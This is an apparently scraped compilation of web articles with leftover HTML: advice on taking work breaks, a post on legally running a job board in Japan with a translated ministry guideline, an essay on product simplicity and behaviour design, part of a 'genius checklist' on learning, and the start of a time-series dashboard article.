idle time and you want to let your mind roam, so be it. But if you're eating, exercising, reading, etc., that's where your focus should be. And if it's not... it might be good to ask yourself why. 😉</p><h2>Actually taking your break</h2><p>We often know something is good for us, but still struggle to act on it. Here are a few techniques to help you veritably press pause:</p><h3>Awareness</h3><p>Awareness is always good to practise, and there's no such thing as being too aware. Here are some cues to help you notice when you need a break:</p><ul data-rte-list="default"><li><p>Low energy level</p></li><li><p>Difficulty focusing</p></li><li><p>Grumpiness</p></li><li><p>Boredom with your task</p></li><li><p>Overwhelm</p></li></ul><p>To be clear, they can have different meanings: you might have trouble focusing for a variety of reasons, one of which is that you need some rest. Try to be mindful of your state by spotting and assessing those cues.</p><p>While listening to your inner state is always beneficial, counting on awareness alone might not be enough. The more you keep working instead of taking a break, the less mindful you're likely to be, and the more chances you have of never taking that break. Don't always trust your brain.</p><h3>Commit &amp; block time</h3><p>Committing helps you remember to take a break, and keeps you accountable towards yourself and others. It's a good first step, but don't think you'll necessarily remember when to take a break, because when you're deep into work, moving from task to meeting to task to meeting, you won't think about it. Here are a few options that you can combine:</p><ul data-rte-list="default"><li><p>Block time in your calendar</p></li><li><p>Add it to your daily to-do list</p></li><li><p>Tell someone about the break you're going to take: your co-worker, your friend, your flatmate</p></li></ul><h3>Pomodoro</h3><p>As a student, <a href="https://francescocirillo.com/pages/francesco-cirillo" target="_blank">Francesco Cirillo</a> was trying to improve his productivity and efficiency by using a tomato-shaped timer. The Pomodoro technique consists of working in blocks of 25 minutes, with 3 to 5-minute breaks in-between. Whenever the timer goes off, you are prompted to press pause on your work. Since you’ve just focused intensely for 25 minutes and are about to hop on to another work block, you are more likely to enjoy a guilt-free timeout. When you resume your task, you are also more likely to focus, since you know regular breaks are ahead. It's a virtuous circle.</p><p>I haven't used the Pomodoro technique myself, but it is widespread and versatile: try various time periods, assess how they go, and pick what works best for you.</p><h3>Anticipate the bliss</h3><p>Remind yourself of why you're taking breaks. One way to do this is to focus on the benefits, to remind yourself that you'll be <a href="https://www.sciencedaily.com/releases/2011/02/110208131529.htm" target="_blank">more focused</a>, <a href="https://ijbnpa.biomedcentral.com/articles/10.1186/s12966-016-0437-z" target="_blank">more energetic and in a better mood</a> afterwards. I think an even better way to do it is to immerse yourself in the feeling of the break. Picture yourself having that break, sipping on your tea, looking out the window, or maybe smelling the trees, feeling at peace. That's appealing, right? Make yourself look forward to it. Anticipate the bliss.</p><h2>Better breaks</h2><h3>Be mindful about it</h3><p>A break spent thoughtlessly scrolling on social media or immersed in a conversation won't restore your energy as well as a mindful break would. Mind-wandering - or daydreaming - <a href="https://greatergood.berkeley.edu/article/item/how_mind_wandering_may_be_good_for_you" target="_blank">improves your creativity and performance</a>. If possible, be in a calm environment, take a step back, reflect on your day, look at the landscape: suddenly, time slows down and clarity improves.</p><h3>Meditate</h3><p>Meditation has been shown to carry countless benefits. In <a href="https://pubmed.ncbi.nlm.nih.gov/29723001/" target="_blank">this 8-week study</a>, workers completing daily Headspace meditations reported better well-being, less distress, less job strain, and a better perception of workplace social support. When practised daily, even for short 13-minute sessions, it can <a href="https://pubmed.ncbi.nlm.nih.gov/30153464/" target="_blank">improve attention, memory, mood, and lower anxiety</a>.</p><p>Mindfulness meditation also <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6397548/" target="_blank">reduces loneliness and enhances the number of social interactions</a>, if focused on both self-monitoring and acceptance:</p><blockquote><p>"Simply bringing greater awareness to the present moment [...] was not enough to impact loneliness or social interactions; it appears critical to learn how to attend to experiences through a lens of acceptance."</p></blockquote><h3>Spend time amongst your greens</h3><p>No, not <em>those</em> greens. I'm referring to spending time in nature, which has been proven to <a href="https://depts.washington.edu/hhwb/Thm_Mental.html" target="_blank">help revive your mind from work</a>. Being in nature provides a cognitive break and helps restore your focus.</p><p>Even micro nature breaks can be beneficial. In <a href="https://www.sciencedirect.com/science/article/abs/pii/S0272494415000328" target="_blank">this research</a>, students who looked at a blooming green roof for 40 seconds had better sustained attention than those who looked at a concrete roof.</p><h3>Get moving</h3><p>Yes, you know it's good for you. You don't need to do a full workout, even light physical activity and relaxation <a href="https://journals.humankinetics.com/view/journals/jpah/12/1/article-p109.xml" target="_blank">decrease the need for recovery</a> after work. If you can do more, even 5 minutes of callisthenics <a href="https://www.sciencedirect.com/science/article/abs/pii/S2211368116301929?via%3Dihub" target="_blank">improves attention and learning</a>. Additionally, walking <a href="https://pubmed.ncbi.nlm.nih.gov/27100368/" target="_blank">improves your mood</a> and <a href="https://www.apa.org/pubs/journals/releases/xlm-a0036577.pdf" target="_blank">your creativity</a>.</p><p>Getting regular breaks during the day means you won't need 6 hours in the evening to come back to life. If you are unable to focus or are unproductive, don't force it: assess why, and get the rest you need.</p><p>Now, go take a break. An actual one, 5 full minutes at least. We've both spent enough time on screens for today. Send me a message <a href="https://twitter.com/This2ShallGrow" target="_blank">on Twitter</a> to tell me if you've done it. I'm counting on you.</p></div></div></div>]]>

November 27, 2020 | https://www.tokyodev.com/2020/11/27/legally-operating-a-job-board-in-japan/ | <a href="https://web.archive.org/web/*/https://www.tokyodev.com/2020/11/27/legally-operating-a-job-board-in-japan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I started <a href="https://www.tokyodev.com/">tokyodev</a> as a side project, and when I first launched it, it never occurred to me that there might be legal repercussions for advertising job postings. However, in Japan, <a href="https://www.tokyodev.com/2020/10/01/recruiting-in-japan/">recruiting is a licensed industry</a>, with criminal penalties of up to a year in prison for practicing without a license, and depending on how a job board is run, it may be classified as recruiting.</p>

<p>Initially my clients were small startups, who weren't even aware of the licensing requirement. However, eventually a prospective client at a larger company was blocked by their legal team because I didn't have a license. This triggered me to investigate the implications of operating a job board in Japan with regards to recruitment licensing.</p>

<p>Fortunately, the employment security bureau has released <a href="https://www.mhlw.go.jp/www2/topics/seido/anteikyoku/minkan/">guidelines</a> that explicitly address the difference between providing a job board and recruitment. They aren't the easiest thing to read, even if you're a native Japanese speaker. I've included a rough <a href="#english">English translation</a> at the end of this article.</p>

<p>The gist of it is, because all the job opportunities on tokyodev are public, I don't solicit specific individuals to apply for jobs, and applications go directly to the companies without me doing any screening, I'm complying with the guidelines and thus don't need a license. Just to be safe, I was able to confirm directly with the employment security bureau that my interpretation is correct, and I'm operating tokyodev in a manner congruent with the guidelines. Furthermore, I was able to get some clarifications from them about some of the finer points.</p>

<p>With tokyodev, I sometimes provide companies with an email address on my domain where candidates can send an application. Applications in turn get forwarded to the company. I confirmed that's allowed, so long as I don't change the contents of the emails or screen the applications. I am allowed to filter out any spam though.</p>

<p>I also confirmed that the method of compensation is independent of whether or not I need a license. Whether I was to charge companies a flat fee to post a job, a fee upon successful hire like traditional recruiters do, or even if I was to post jobs for free, it wouldn't make a difference with regards to licensing requirements.</p>

<p>I still sometimes have companies asking me if I have a license, but since I've been able to point them to the guidelines, I've been able to move forward with them despite not having one.</p>

<p><em id="english">Translation of <a href="https://www.mhlw.go.jp/www2/topics/seido/anteikyoku/minkan/">the Japanese guidelines</a> follows. Please note that the translation was done by someone who's not an expert in the area, and so shouldn't be relied upon for more than getting an overview of the guidelines.</em></p>

<h2 id="guidelines-to-distinguish-between-providing-information-of-job-seekers-and-job-offers-and-employment-placement-on-the-internet-by-a-private-company">Guidelines to distinguish between providing information of job seekers and job offers, and employment placement on the internet by a private company</h2>

<p>Guidelines to judge whether or not an online job site run by a private company is deemed to be an “employment placement” prescribed by Article 4-1 of Employment Security Law are determined as follows. If a person is going to do a business defined as “employment placement” by these guidelines, he/she needs to be approved by Minister of Health, Labor and Welfare. Each item has a specific example.</p>

<h3 id="background">Background</h3>

<p>1. Article 4-1 of Employment Security Law defines “employment placement” as “to accept job posting and job application and to encourage employment agreement between recruiters and job seekers. Therefore, an online site which only provides information of recruiters and job seekers, and does not accept job applications nor encourage employment agreements is called “information provider” and is not deemed to be “employment placement” with need to be legitimately approved.</p>

<p>2. However, recently, providing information of recruiters and job seekers on the internet has been increasing, and some of them have been changing their roles from just being “information providers” to something more than just enabling to browse information of recruiters and job seekers. This includes enabling mutual communications between recruiters and job seekers as well as establishing a way to automatically send information that matches recruiters’ requirements and/or job seekers’ qualifications. Of course, not all of them are deemed to be an “employment placement”, but there are some cases that are difficult to determine whether or not it should be deemed to be an “employment placement”. This is why these guidelines were created.</p>

<h3 id="guidelines-to-determine-if-an-online-job-site-run-by-a-private-company-is-just-an-information-provider-or-employment-placement">Guidelines to determine if an online job site run by a private company is just an information provider, or employment placement</h3>

<p>I. These guidelines are to make clear the difference of “recruiters and job seekers’ information provider” and “employment placement” on the internet in order to secure adequate operation of the law.</p>

<p>II. In these guidelines, “providing recruiters and job seekers’ information on the internet” means that an information provider allows recruiters and job seekers to view job information (both includes information that enables people to identify individual recruiter or job seeker such as company’s name and address, job seeker’s name and address, which will be called just “information” hereafter) on its homepage.
Besides, it includes providing additional services for job seekers or recruiters, such as providing a convenient way to create and send emails for job application or recruitment.</p>

<p>III. If an online recruiters’ and job seekers’ information provider matches either of following 1 to 3, it is deemed to be an employment placement.</p>

<ol>
  <li>Without objective and explicit search criteria set in advance, information provider chooses and changes the contents of information or who it is providing.</li>
  <li>Information provider informs job seekers of job information, or inform recruiters of job seekers’ information. (Example 2)</li>
  <li>When communications between job seekers and recruiters are relayed via information provider’s homepage, it changes the contents for the communication. (Example 3)</li>
</ol>

<p>IV. Besides III, based on the contents of information provider’s advertisement, and/or the contents of contracts between information provider and job seekers or recruiters, if information provider is introducing job seekers to recruiters or recruiters to job seekers, and providing information of job seekers and recruiters on the internet is conducted as a part of it, it is overall deemed to be an employment placement. (Example 4)</p>

<h4 id="example-2-information-provider-itself-encourages-job-applications-or-hiring">Example 2: Information provider itself encourages job applications or hiring</h4>

<p>Although when information provider proactively contacts job seekers or recruiters to encourage applying or hiring, adjusts schedule for job interviews, or provides additional information, and it is considered just to assist recruitment successes, it is deemed to be an employment placement.</p>

<p>However, even when all of these are conducted online, it is considered that information provider and job seekers or recruiters only use emails as a substitute communication tool for job interview, telephone, fax or mails. Therefore, it does not influence on judging whether or not it is deemed to be an employment placement.</p>

<h4 id="example-3-job-seekers-or-recruiters-to-apply-for-a-job-or-recruit-people-by-emails-via-homepage-of-information-provider-but-still-information-provider-is-not-deemed-to-be-an-employment-placement">Example 3: Job seekers or recruiters to apply for a job or recruit people by emails via homepage of information provider, but still information provider is not deemed to be an employment placement</h4>

<p>If information provider is only providing necessary email addresses without changing the contents of communications when information provider allows job seekers or recruiters to send emails to recruiters or job seekers via its homepage in order to apply for a job or recruit people directly online, it is not deemed to be an employment placement.
Also, regarding the emails, when information provider has a specific form to allow job seekers or recruiters to fill in necessary information and create emails, it is not deemed to be an employment placement.</p>

<h4 id="example-4-advertisement-targeting-job-seekers-and-job-recruiters-as-an-employment-placement">Example 4: Advertisement targeting job seekers and job recruiters as an employment placement</h4>

<p>If information provider recruits job seekers or recruiters by saying something like “we will find a job you are looking for” or “we will introduce candidates who will fit your company”, and provides potential recruiters or job seekers information such as names and phone numbers to job seekers or recruiters on the internet, it is deemed to be an employment placement as a whole.</p>

<![CDATA[What the Fuck Is Simplicity]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-89cfead268f30384aa7d"><div><p><em>TLDR: Simplicity is still a controversial topic. Most argue that consumers desire simpler products. Some argue that they want simplicity but only if it is executed correctly (what that means is often left undefined). And a few believe that it’s actually complexity that makes consumers buy. This disagreement is rooted in the fact that no one seems to agree on what simplicity means. I suggest avoiding using it in any professional capacity, in favor of a more precise tool kit. What motivates the buying decision are the 3 components of the Fogg Behavior Model: motivation, ability, and prompt. Motivation, in order to make the sale, can be further broken down into the Job To Be Done (why is the consumer hiring the product?) and acute satisfaction (how badly do they want it in that moment?). Ability, making a behavior easier or harder to do, can be subdivided into time, money, physical effort, mental effort, repetition, social deviance, location in space, and location in time. Getting comfortable with these concepts will give you a productive framework to work with when deciding what features to include/exclude, and help you create products people actually want to buy, use, and recommend.</em></p><p>One of the most fundamental theorems to have come out of behavior science is that <strong>shine changes behavior</strong>.</p><p>What’s shine? Shine is the emotion you feel when you feel successful. When you aced that job interview, got your first customer, or finally won that match in your game or sport. [1] By making behavior easy to do, you increase the probability that you’ll succeed instead of fail. When you succeed, you feel successful which reinforces the connection in your brain between that behavior and that positive feeling, and that leads  to behavior change.&nbsp;</p><p>Simplicity → Shine → Behavior Change.</p><p>Because simplicity means so many different things to so many different people, a more precise way to think about it is in terms of ability. High ability means a behavior is easy to do. Low ability means it’s hard to do. So when you’re thinking about consumer behavior change, think about increasing ability, making it easy to do.</p><p><em>For the purpose of this essay you can use consumer and user interchangeably.</em></p><p>Obvious right? Well, no. The problem with fields like behavior science is tool bias. Which I described in <a href="https://www.younglingfeynman.com/essays/covid" target="_blank">Covid-19 And Human (Ir)Rationality — PART 1</a>:</p><blockquote><p>“This is a fascinating bias I call tool bias (if it has an official name, let me know), which ties the complexity of the tool to the perception of difficulty. Math can appear complex even when the application is very simple. Influencing behavior can appear simple even when the application is very complex. This phenomenon occurs in comedy as well. It’s easy to underestimate how difficult it is to create a good set because the tools (language) are simple, so while you laugh you think, I could do this easily.”</p></blockquote><p>I.e. behavior science suffers from hindsight bias because it’s so easy to understand. It all appears obvious ex post facto.&nbsp;</p><p>If something seems easy, we think “that must BE easy.”</p><p>But if you were to ask around as to what creates behavior change, you’d get many different answers (mainly around motivation) but making things easy to do wouldn’t be one of them. [2]</p><p>Okay, if simplicity or more precisely, increasing ability is so important (and obvious) then why are products so complicated?</p><p>Because it’s that very complexity that sells.</p><p>When we see something that’s complex, we think “that must have a lot of value.” If you’re a consultant giving simple answers to complex problems, it seems as though you’re not very smart or, at the very least, you aren’t taking it seriously. When you make it so complex that people can hardly follow along, it becomes hard for people to estimate the boundaries of your knowledge.&nbsp;</p><p>E.g. suppose you hire a consultant to help you with next year’s strategy. If they give you a thick stack of papers that supports their conclusion, you’ll perceive it more favorably than if they give you a single sheet with 2 paragraphs on it, sharing that same conclusion. Complexity acts as a heuristic for value. [3]</p><p><em>An obvious, but important nonetheless note, is that truth has to be measured by truth, not truthiness. </em><strong><em>Complexity impacts truthiness but it has no correlation with truth</em></strong><em>. I.e. just because something is complex doesn’t make it true. Just because something is simple doesn’t make it false. But that’s exactly the cognitive bias we have and partly explains our obsession with data-driven arguments. Read </em><a href="https://www.younglingfeynman.com/essays/misleadingdata?rq=data" target="_blank"><em>Your Data Is Lying To You And You’re Listening</em></a><em> for more on that.</em></p><p>Is this only true in information? No. You see the same phenomenon from consumer products to enterprise software.</p><p>According to Thompson, Hamilton, and Rust (2005), increasing the complexity of a product can have a positive effect on consumer satisfaction because of an increase in perceived capability.</p><p>Look at the following products:</p><p><strong>Stripey toothpaste: </strong>Why do they go to so much trouble to make sure stripey toothpaste comes out of the tube, well… stripey? An overly logical engineer would see that and claim that you should just mix the products. It would have the exact same effect on oral hygiene and you’d actually save on cost. But that’s only correct if your customers were logical robots. But they’re emotional humans. Consumers simply don’t believe your toothpaste has 3 functions if they don’t see it. ‘’Healthy gums. Strong teeth. Fresh breath.” Show me, don’t tell me.</p><p><strong>Dishwashing tablet: </strong>Same argument. Just blend all the ingredients into one homogenous tablet. But again, I, the consumer, wouldn’t believe you.</p><p><strong>Toilet rim block: </strong>Look at how these simple blocks have grown in complexity. Multiple liquids in a container, different colored solid spheres, sticky discs you shoot onto your bowl, etc. [4]</p><p><strong>Coffee machine: </strong>The most expensive ones have the most gizmos. More features to increase perceived capability, which is exactly what I, the consumer, want. Take Dolce Gusto machines for example. A manual lever to flip to make coffee? What am I, a 17th-century peasant?! I’ll take the model with the fancy LCD touch screen so I can feel like Louis the 14th thank you very much.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_102553"><p><strong>Cars: </strong>Steering wheels with roughly similar complexity as NASA's mission control. Mirrors that can be moved electronically, are heated, dim based on light intensity, and more. Just take a look at the incredible feature set of these 2021headlights:</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_35746"><p><strong>iOS:</strong> Remember that the original “iPhone OS” didn’t even have an Appstore yet? Just the 15 apps that shipped with the phone. Now you got an app for everything, cameras that rival mirrorless cameras and DSLRs in the right conditions, and more power than many laptops.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_27120"><div><p>It seems that if we want to sell more, we should simply add features.</p><p>Well, yes. But also… well, no.</p><p>There are many UX experts that advocate precisely this. “Simplicity is overrated and consumers, ceteris paribus, want more features because they want the most powerful products.”</p><p>This is partly true. Would you pay more for a phone that does less? It has a basic camera, or perhaps no camera, it has less memory, it’s not fast, it’s missing features (even if you don’t use them). Probably not. While one can imagine an audience of minimalists for that, one can’t imagine that they’d pay more for it than the flagship phone which sets the anchor for that particular price hierarchy.</p><p>But if that’s the whole story, that raises the question, why do products ever get disrupted? Surely, if features sell then Yahoo wouldn’t have gotten disrupted by Google. Or Netflix by Blockbuster. Or Facebook by Myspace. Or any other startup, since pretty much all of them started very simple.</p><p>The erroneous assumption here is that simple means getting rid of features. But a car that’s missing two wheels, the engine, and the body, that’s not simplicity. That’s not even a car. A bagless vacuum cleaner — &gt; a cordless bagless vacuum cleaner — &gt; the Dysons we have now with all kinds of attachments, different vacuum heads, and automatically adjusting suction levels… now you’ve got my attention. The “simple” Dysons still had high usability despite lower capability. So it’s not just about removing features, it’s about being diligent about which features you do add. And your customers are the arbiter that decide whether or not you got it right.</p><p>On top of that, Rust, Thompson, and Hamilton (2006) demonstrated that an increase in features (even the right features) doesn’t automatically translate into more consumer satisfaction. In fact, as perceived capability increases, perceived usability decreases. This is known as feature fatigue. (Thompson, Hamilton &amp; Rust, 2005; See also Kemenade, 2018).</p><p>So if we can’t simply add or remove features, how should we think about getting consumers to buy?</p><p>The user needs to want it (motivation), they need to be able to buy it (have the ability), and be provoked into buying it (prompt). (Fogg, 2009). Ability usually isn’t the most constraining factor. If a consumer really wants to buy something, they’ll take care of any cognitive dissonance for you. E.g. “I don’t have the space for this new guitar. But damn, I really want it. Okay, I’ll just clean up the attic, and then I’ll have enough space.” (Which they won’t do). Not carrying (enough) money is also not really an issue anymore with Apple Pay and the like.&nbsp;</p><p>You could imagine a physical constraint. E.g. they wanna buy but the product is too big to take home in their car. That’s a place where you could offer some delivery service to solve for ability. E.g. Ikea or AptDeco. Or your site only accepts credit cards, which are never used in The Netherlands. In which case the user probably wouldn’t buy because it’s too much of a hassle. </p><p>Prompts aren’t perfect in 2020 but rarely do products fail because they were so amazing yet the company simply forgot to tell people about it. And pretty much the only thing marketers actually understand is CTA: Call To Action, which is just another word for prompt. So buying is primarily a motivation issue. And secondarily an …</p></div></div></div>

November 27, 2020 | https://supermemo.guru/wiki/Genius_checklist | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Genius_checklist">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<p><small>Compiled on the basis of the original list presented here: <i><a href="http://super-memory.com/articles/genius.htm">Roots of genius and creativity</a></i>, <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2001)</small>
</p>
<h2><span id="How_to_become_a_genius">How to become a genius</span></h2>
<p>A majority of people carry the potential to become a genius. There are factors that are far <a href="https://supermemo.guru/wiki/Simple_formula_for_high_intelligence" title="Simple formula for high intelligence">more important than genes and IQ</a>. I have compiled a checklist that I believe should work, when followed. All you need to begin with is to be free and reasonably healthy. I try to list the factors that prevent many people from accomplishing their greatest potential. The list begins with the stumbling blocks that are most likely to occur on one's road to genius. Some factors need to be balanced against each other, and some factors overlap. For example, the first three preconditions of genius are strongly related: freedom from <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a>, <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">good sleep</a>, and <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. They may provide the key to answering why we are not (yet) a planet of geniuses. I listed individual points separately on the basis of their ability to motivate and inspire. Before you start reading, however, remember what Herbert Simon said about genius: it takes about ten years to develop it. Not only will you have to meet all the criteria listed below, but lots of hard work and patience will be required before you climb that summit!
</p>
<p>If you follow these rules religiously, you will be amazed by how much progress you can make in a decade</p> 
<p>If I scare you with a decade-long time-frame, remember that chances are good that you will love your self-transformation in weeks. The younger you are, the 'messier' your life, the less you know about your future, the more powerful the effect.
</p>
<h3><span id="Eliminate_stress">Eliminate stress</span></h3>
<p>Stress is understood here as rapid change resulting in an increase in stress hormones (catecholamines, ACTH, cortisol, etc.). Stressful change can come from conflict, illness, the death of a relative, or unemployment. Stress can also result from seemingly happy events such as a wedding or a hasty vacation. A simple test here is to make sure that creative problems circulate in your mind while you are brushing your teeth. You will fail the test if, instead of creative thinking, you are preoccupied with problems at work or in the family. Stress will dramatically cut down your creative efficiency. Most of all, it will affect your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>: another cornerstone of genius. In addition, <a href="https://supermemo.guru/wiki/Chronic_stress" title="Chronic stress">chronic stress</a> will result in excess cortisol, increased activity in the sympathetic system, and a resulting inhibition of neurogenesis, memory consolidation, creativity, and more. See: <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">Stress resilience</a>
</p>
<h3><span id="Sleep">Sleep</span></h3>
<p>Make sure to always get as much quality sleep as <a href="https://supermemo.guru/wiki/Free_running_sleep" title="Free running sleep">your brain requires</a>. The simplest first step is: <a href="https://supermemo.guru/wiki/Kill_the_alarm_clock" title="Kill the alarm clock">throw away your alarm clock</a>! Lack of sleep delivers a quadruple whammy: (1) it suppresses memory consolidation, (2) it prevents <a href="https://supermemo.guru/wiki/Memory_optimization_in_sleep" title="Memory optimization in sleep">memory optimization</a>, (3) it makes you unwilling to exert mental effort, and (4) it undermines your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. Submit to the <a href="https://supermemo.guru/wiki/Natural_creativity_cycle" title="Natural creativity cycle">natural creativity cycle</a>. For more see: <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">Science of sleep</a>
</p>
<h3><span id="Self-discipline">Self-discipline</span></h3>
<p>Lack of self-discipline aggravated by stress and a lack of sleep is the number one cause of low productivity. The trick to achieving good self-discipline is to make incremental progress, and convert discipline into a habit and then into the pleasure of productivity (for more see: <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">Self-discipline</a>).
If you develop healthy self-discipline habits early, your life is likely to take an entirely different course. If you believe you are lacking in this field, try the following exercise: as soon as a valuable activity comes to your mind that you are really unwilling to do, <b>do it</b>. Within the scope and in agreement with human biology, your rational brain must be the master of your decision making. Stand over a pool of cold water. Do you hate jumping in? The more you hate it, the sooner you should jump. And in the end you will <a href="https://supermemo.guru/wiki/Winter_swimming" title="Winter swimming">love it</a>. A cold shower is a minor inconvenience once you experience the volitional power of the brain. You need to master the skill of perfect execution of your own plans. The more precise your plan, the harder it is to execute, yet the more tangible the results. Learn to delay gratification. If you focus on your long-term goals, your daily inconveniences will be more bearable or even pleasurable. A strenuous quest towards the goal is the best reward for a genius mind. Minor awards of laziness do not befit a true genius. Think of self-discipline daily. Even the strongest minds can relax it all too easily. Remember about stress and sleep. Stress and sleepiness are chief factors that undermine self-discipline. Self-discipline cannot quarrel with biology. In extreme cases, it can actually <a href="https://supermemo.guru/wiki/War_of_the_networks" title="War of the networks">undermine your genius</a>. If you are sick, stop working. If you are sleepy, go to sleep. For comfort, you should know, that with each passing year, self-discipline will gradually transform into a pleasure. Not only will you <a href="https://supermemo.guru/wiki/Plan" title="Plan">execute your plans instinctively</a>, you will also reap the benefits of your earlier efforts to steer your life in a good direction. In later years, you will not need much self-discipline to employ your genius mind to do good things.
</p>
<h3><span id="Learn_day_and_night">Learn day and night</span></h3>
<p>Knowledge is the substance you <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">convert to great ideas</a>. Although it is possible to learn in stress or in a <a href="https://supermemo.guru/wiki/Sleep_deprivation" title="Sleep deprivation">sleep deficit</a>, learning is listed here behind stress, sleep and self-discipline. This is because humans exhibit <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">inborn curiosity</a> that makes them crave learning. TV, tabloid press, and social media thrive on this need for learning. Most people understand the importance of learning but are prevented from executing their plans due to stress, lack of sleep or lack of self-discipline. To breed genius, your whole life should revolve around learning. You should use every single little opportunity to learn important things. This could be reading Einstein's biography or talking with a homeless person. Read, talk, watch, surf, and keep on thinking. Do not avoid hard subjects (e.g. mathematics). Mold your learning strictly to your creative needs, but do not fail to explore a wide range of topics. Touch all the bases and avoid tunnel vision! Remember that your success in learning will require appropriate <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">knowledge representation</a> and timing of review (as in <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>). Are you lacking a university education? <a href="https://supermemo.guru/wiki/School_dropouts" title="School dropouts">Never mind</a>. Look at Edison, Lincoln, or Leibnitz to see the power of <a href="https://supermemo.guru/wiki/Self-learning" title="Self-learning">self-instruction</a>. All the seemingly contradictory requirements listed above can be reconciled if you structure your learning with <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. See: <a href="https://supermemo.guru/wiki/Advantages_of_incremental_reading" title="Advantages of incremental reading">Advantages of incremental reading</a>
</p>
<h3><span id="Abstract_knowledge">Abstract knowledge</span></h3>
<p>Except for a great deal of learning, you will need to pay attention to the <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">quality of knowledge</a> and its general <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a>. You cannot just memorize thousands of facts. You have to consciously explore areas such as logic, probability, statistics, game theory, decision theory, computing sciences, optimization, as well as other branches of mathematics and sciences. You have to develop a love for logical thinking, the scientific method, and skepticism. Even if you are a movie critic, you will still need quality logic to frame your judgment. Remember that all knowledge is volatile and may be subject to falsification at any time. Keep your mind open to new truths even if they seem to turn your present vision of the world upside down
</p>
<h3><span id="Knowledge_representation">Knowledge representation</span></h3>
<p>The main thing that makes a genius brain stand out is its ability to store <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">quality knowledge</a> in a way that is <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">easy to remember</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">easy to use</a>. A genius mind can see complex things in a simple form. It looks at the same text or picture and sees a dozen times more than an average individual. An average reader will say: <i>"I understand, so what?"</i>. A genius reader will say: <i>"Eureka!"</i>, and list several applications of the just acquired piece of knowledge. Geniuses simplify while learning. They <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalize</a>. They build <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract models</a>. They develop abstract languages for representing knowledge. Those representation skills can also be developed by training. Have you ever tried to learn Kanji (Japanese language symbols)? If you see Kanji as a tangle of confused sticks, you are a typical beginner. Over time, however, Kanji symbols should begin to sing to you and talk to you in their own language. Once you pass the first few hundred, the next thousand should go smoothly. The same happens if you learn the 20x20 multiplication table. With time you learn simple tricks for running simple and repetitive calculations. Instead of memorizing 20x20 combinations, you limit yourself to a standard 10x10 table (just 25% of all combinations) and add to this a few rules for manipulating numbers in your <a href="https://supermemo.guru/wiki/Working_memory" title="Working memory">working memory</a>. The best way to develop good representations is to (1) understand the way the memory works (see: <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">20 rules of formulating knowledge</a>), (2) consciously modify representations in the learning process (e.g. <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a> supports this process naturally) (3) work on <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> (the more you learn the easier it becomes), and (4) get <a href="https://supermemo.guru/wiki/Good_sleep" title="Good sleep">good sleep</a> to employ <a href="https://supermemo.guru/wiki/Neural_optimization_in_sleep" title="Neural optimization in sleep">neural optimization in sleep</a>. If you encounter a difficult problem in <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>, postpone it. With luck, some other information source will present to you a better representation that is easier to assimilate.
</p>
<h3><span id="Health">Health</span></h3>
<p>Take obsessive care of your health! Keep your blood pressure down (high blood pressure damages your brain), do not <a href="https://supermemo.guru/wiki/Impact_of_alcohol_on_sleep" title="Impact of alcohol on sleep">abuse alcohol</a> (any dose that visibly affects your mental performance may be poisonous to your brain), use medication only when absolutely necessary, exercise, stay away from smoking or illicit drugs, learn medical sciences!!! Your brain is a highly sensitive organ that needs a healthy environment to operate in. Health and understanding of the biological needs of your brain may dramatically affect your performance in the long run. Don't waste time on <a href="https://supermemo.guru/wiki/Formula_for_common_cold_prevention" title="Formula for common cold prevention">colds and flu</a>

<h3><span id="Negative_emotion">Negative emotion</span></h3>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>With its unique dashboards as code approach, Warp 10 Discovery is the tool of choice to create highly dynamic dashboards from your time series data</p><article>
      
<p>When you hear people talk about time series, chances are pretty high they will also coin the term dashboard in the same conversation. The reason for that is simple. <strong>Among the first things people do when working with time series databases is the creation of dashboards to visualize the stored data.</strong></p>



